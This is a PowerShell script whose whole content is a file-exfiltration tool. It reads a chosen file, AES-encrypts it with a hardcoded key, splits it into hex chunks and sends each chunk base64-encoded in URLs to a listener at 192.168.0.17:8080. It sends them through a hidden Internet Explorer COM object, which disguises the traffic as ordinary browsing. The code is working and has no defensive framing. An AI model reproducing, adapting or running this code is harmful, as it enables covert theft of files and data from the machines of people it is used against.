function Send-HTTPRequest {
    param ([string] $data, [System.__ComObject] $IE)
    $url = 'http://192.168.0.17:8080/';
    $data = Base64 $data;
    $IE.navigate2($url+$data)
    Start-Sleep -s 2;
};

function HTTP-exfil {
    param ([string] $file)
    $bytes = [System.IO.File]::ReadAllBytes($file)
    $md5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
    $hash = [System.BitConverter]::ToString($md5.ComputeHash($bytes))
    $hash = $hash -replace '-','';
    $IE = new-object -com internetexplorer.application;
    $data = [System.IO.File]::ReadAllBytes($file)
    $data = AES $data
    $string = [System.BitConverter]::ToString($data);
    $string = $string -replace '-','';
    $filename = Split-Path $file -leaf
    $len = $string.Length;
    #$split = Get-Random -minimum 1 -maximum 250;
    $split = 300
    $id = 0
    $repeat=[Math]::Ceiling($len/$split);
    $remainder=$len%$split;
    $jobid = [System.Guid]::NewGuid().toString().Substring(0, 7)
    $data = $jobid + '|!|' + $filename + '|!|REGISTER|!|' + $hash 
    $q = Send-HTTPRequest $data $IE
    for($i=0; $i-lt$repeat-1; $i++){
        $str = $string.Substring($i * $Split, $Split);
        $data = $jobid + '|!|' + $i + '|!|' + $str
        $q = Send-HTTPRequest $data $IE
    };
    if($remainder){
        $str = $string.Substring($len-$remainder);
        $i = $i +1
        $data = $jobid + '|!|' + $i + '|!|' + $str
        $q = Send-HTTPRequest $data $IE
    };
    
    $i = $i + 1
    $data = $jobid + '|!|' + $i + '|!|DONE'
    $q = Send-HTTPRequest $data $IE
};

function Base64 {
    param ([string] $data)
    $Bytes = [System.Text.Encoding]::ASCII.GetBytes($data)
    return [Convert]::ToBase64String($Bytes)    
}

function AES {
    param ([byte[]] $data)

    $key = "THISISACRAZYKEY"
    $sha256 = New-Object System.Security.Cryptography.SHA256Managed

    $AES = New-Object System.Security.Cryptography.AesManaged
    $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $AES.BlockSize = 128
    $AES.KeySize = 256
    $AES.Padding = "PKCS7"
    $AES.Key = [Byte[]] $sha256.ComputeHash([Text.Encoding]::ASCII.GetBytes($key))

    $IV = new-object "System.Byte[]" 16
    $RNGCrypto = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
    $RNGCrypto.GetBytes($IV)
    $AES.IV = $IV

    $Encryptor = $AES.CreateEncryptor()

    return ($IV + $encryptor.TransformFinalBlock($data, 0, $data.Length))
};

function Convert-ToCHexString {
    param ([String] $str) 
    $ans = ''
    [System.Text.Encoding]::ASCII.GetBytes($str) | % { $ans += "{0:X2}" -f $_ }
    return $ans;
}